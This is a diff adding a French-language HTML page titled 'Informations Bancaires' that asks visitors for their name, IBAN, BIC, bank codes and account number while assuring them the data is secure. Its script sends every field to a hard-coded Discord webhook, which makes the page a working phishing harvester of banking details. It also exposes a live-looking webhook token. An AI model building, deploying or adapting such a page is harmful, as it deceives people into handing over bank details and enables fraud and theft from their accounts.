@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Informations Bancaires</title>
+
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body{
+      background:#f4f7fb;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      min-height:100vh;
+      padding:20px;
+    }
+
+    .container{
+      width:100%;
+      max-width:650px;
+      background:white;
+      border-radius:18px;
+      padding:40px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.08);
+    }
+
+    .header{
+      text-align:center;
+      margin-bottom:35px;
+    }
+
+    .header h1{
+      color:#1d3557;
+      font-size:32px;
+      margin-bottom:10px;
+    }
+
+    .header p{
+      color:#6b7280;
+      font-size:15px;
+    }
+
+    .form-group{
+      margin-bottom:22px;
+    }
+
+    label{
+      display:block;
+      margin-bottom:8px;
+      color:#374151;
+      font-weight:600;
+      font-size:14px;
+    }
+
+    input{
+      width:100%;
+      padding:14px;
+      border:1px solid #d1d5db;
+      border-radius:10px;
+      font-size:15px;
+      transition:0.3s;
+      background:#fafafa;
+    }
+
+    input:focus{
+      outline:none;
+      border-color:#2563eb;
+      background:white;
+      box-shadow:0 0 0 4px rgba(37,99,235,0.1);
+    }
+
+    .row{
+      display:flex;
+      gap:15px;
+    }
+
+    .row .form-group{
+      flex:1;
+    }
+
+    button{
+      width:100%;
+      padding:15px;
+      border:none;
+      border-radius:12px;
+      background:#2563eb;
+      color:white;
+      font-size:16px;
+      font-weight:bold;
+      cursor:pointer;
+      transition:0.3s;
+      margin-top:10px;
+    }
+
+    button:hover{
+      background:#1d4ed8;
+    }
+
+    .footer{
+      margin-top:25px;
+      text-align:center;
+      color:#9ca3af;
+      font-size:13px;
+    }
+
+    @media(max-width:600px){
+      .row{
+        flex-direction:column;
+      }
+
+      .container{
+        padding:25px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+
+    <div class="header">
+      <h1>Informations Bancaires</h1>
+      <p>Veuillez renseigner les informations de votre RIB</p>
+    </div>
+
+    <form id="bankForm">
+      <div class="form-group">
+        <label>Nom du titulaire</label>
+        <input type="text" id="nom" placeholder="Ex : Jean Dupont">
+      </div>
+
+      <div class="form-group">
+        <label>IBAN</label>
+        <input type="text" id="iban" placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX">
+      </div>
+
+      <div class="form-group">
+        <label>BIC / SWIFT</label>
+        <input type="text" id="bic" placeholder="ABCDEFGHXXX">
+      </div>
+
+      <div class="row">
+        <div class="form-group">
+          <label>Nom de la banque</label>
+          <input type="text" id="nomBanque" placeholder="Ex : Crédit Agricole">
+        </div>
+
+        <div class="form-group">
+          <label>Pays</label>
+          <input type="text" id="pays" placeholder="France">
+        </div>
+      </div>
+
+      <div class="row">
+        <div class="form-group">
+          <label>Code Banque</label>
+          <input type="text" id="codeBanque" placeholder="12345">
+        </div>
+
+        <div class="form-group">
+          <label>Code Guichet</label>
+          <input type="text" id="codeGuichet" placeholder="67890">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Numéro de compte</label>
+        <input type="text" id="numeroCompte" placeholder="XXXXXXXXXXX">
+      </div>
+
+      <button type="button" onclick="sendToWebhook()">Confirmer les informations</button>
+    </form>
+
+    <div class="footer">
+      Vos informations sont sécurisées et protégées.
+    </div>
+
+  </div>
+
+  <script>
+    function sendToWebhook() {
+      const webhookUrl = 'https://discord.com/api/webhooks/1505660590750699521/-ezPlG3TgtK8PKSs_TUQ9Q1kj-wLXDBvYR25U8w1XcFxv1gj-wZfiCfLyx5NrGNNe8-H';
+      const nom = document.getElementById('nom').value;
+      const iban = document.getElementById('iban').value;
+      const bic = document.getElementById('bic').value;
+      const nomBanque = document.getElementById('nomBanque').value;
+      const pays = document.getElementById('pays').value;
+      const codeBanque = document.getElementById('codeBanque').value;
+      const codeGuichet = document.getElementById('codeGuichet').value;
+      const numeroCompte = document.getElementById('numeroCompte').value;
+
+      const message = `Nom du titulaire: ${nom}\nIBAN: ${iban}\nBIC/SWIFT: ${bic}\nNom de la banque: ${nomBanque}\nPays: ${pays}\nCode Banque: ${codeBanque}\nCode Guichet: ${codeGuichet}\nNuméro de compte: ${numeroCompte}`;
+
+      const request = new XMLHttpRequest();
+      request.open('POST', webhookUrl);
+      request.setRequestHeader('Content-type', 'application/json');
+      request.send(JSON.stringify({ content: message }));
+    }
+  </script>
+
+</body>
+</html>
